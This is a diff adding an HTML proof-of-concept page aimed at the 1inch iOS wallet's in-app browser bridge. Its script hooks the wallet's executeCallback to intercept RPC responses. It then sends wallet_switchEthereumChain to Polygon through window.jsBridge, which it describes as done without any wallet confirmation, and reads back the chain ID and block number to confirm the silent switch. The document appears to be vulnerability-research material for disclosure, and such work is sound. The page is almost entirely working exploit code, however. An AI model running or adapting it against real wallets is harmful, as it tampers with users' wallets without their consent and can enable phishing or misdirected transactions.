@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>1inch Wallet - Chain Switch Ground-Truth PoC v2</title>
+<style>
+body { font-family: monospace; margin: 12px; background: #111; color: #0f0; }
+h2 { color: #fff; }
+#log div { padding: 2px 0; border-bottom: 1px solid #222; }
+.ok { color: #0f0; font-weight: bold; }
+.err { color: #f44; font-weight: bold; }
+</style>
+</head>
+<body>
+<h2>1inch Wallet - Chain Switch PoC v2 (with ground-truth readback)</h2>
+<div id="log">loading…</div>
+<script>
+var EL = document.getElementById('log');
+var log = function(s) { var d = document.createElement('div'); d.innerHTML = s; EL.appendChild(d); };
+var OK = function(s) { log('<span class="ok">' + s + '</span>'); };
+var ERR = function(s) { log('<span class="err">' + s + '</span>'); };
+
+/* --- 1. capture every RPC response the wallet pushes to the page --- */
+window.__hookState = 'waiting';
+function installHook() {
+    var w = window.OneInchIOSWallet;
+    if (!w) return false;
+    if (w.executeCallback && w.executeCallback.__hooked) { window.__hookState = 'hooked'; return true; }
+    var orig = w.executeCallback ? w.executeCallback.bind(w) : null;
+    var hook = function(id, result) {
+        try {
+            var parsed = JSON.parse(result);
+            var status = parsed.error ? ('<span class="err">ERROR</span> ' + JSON.stringify(parsed.error)) : 'OK';
+            log('RESP id=' + id + ' → ' + status + ' <span style="color:#aaa">' + result + '</span>');
+            if (id === 1) {
+                if (parsed.error) ERR('CHAIN SWITCH REJECTED: ' + JSON.stringify(parsed.error));
+                else OK('STEP1 wallet_switchEthereumChain(0x89) ACCEPTED — no wallet confirmation shown, no rejection');
+            } else if (id === 2) {
+                if (parsed.result === '0x89') OK('STEP2 eth_chainId = ' + parsed.result + ' → WALLET NOW RESOLVES POLYGON (137). Chain switch TERMINATED.');
+                else log('STEP2 eth_chainId = ' + parsed.result + ' (still old chain?)');
+            } else if (id === 3) {
+                log('STEP3 eth_blockNumber = ' + parsed.result);
+                if (parsed.result) OK('STEP3 wallet queried a live block number on the POST-SWITCH chain.');
+            }
+        } catch (e) {
+            log('hook parse: ' + e.message + ' raw=' + result);
+        }
+        if (orig) { try { orig(id, result); } catch (e2) { log('orig cb err: ' + e2.message); } }
+    };
+    hook.__hooked = true;
+    w.executeCallback = hook;
+    window.__hookState = 'hooked';
+    log('INFO executeCallback hook installed on OneInchIOSWallet');
+    return true;
+}
+if (!installHook()) {
+    setTimeout(installHook, 300);
+    setTimeout(installHook, 800);
+}
+setTimeout(function(){ if (window.__hookState !== 'hooked') log('<span class="err">WARN: executeCallback hook NOT installed (library missing?)</span>'); }, 1200);
+
+/* --- 2. run the attack: switch to Polygon, then read chain back --- */
+function send(method, params, id) {
+    var payload = {method: method, params: params, jsonrpc: '2.0', id: id};
+    log('SENT ' + method + ' id=' + id + ' ' + JSON.stringify(payload));
+    window.jsBridge.postEvmMessage(JSON.stringify(payload));
+}
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        if (!(window.jsBridge && window.jsBridge.postEvmMessage)) { ERR('jsBridge NOT available'); return; }
+        OK('INFO jsBridge available; executing WITHOUT any wallet confirmation');
+        log('--- STEP 1: silent wallet_switchEthereumChain to 0x89 (Polygon) ---');
+        send('wallet_switchEthereumChain', [{chainId: '0x89'}], 1);
+        setTimeout(function() {
+            log('--- STEP 2: read back eth_chainId ---');
+            send('eth_chainId', [], 2);
+        }, 2500);
+        setTimeout(function() {
+            log('--- STEP 3: read back eth_blockNumber (proves live RPC on the switched chain) ---');
+            send('eth_blockNumber', [], 3);
+        }, 5000);
+    }, 1200);
+});
+</script>
+</body>
+</html>
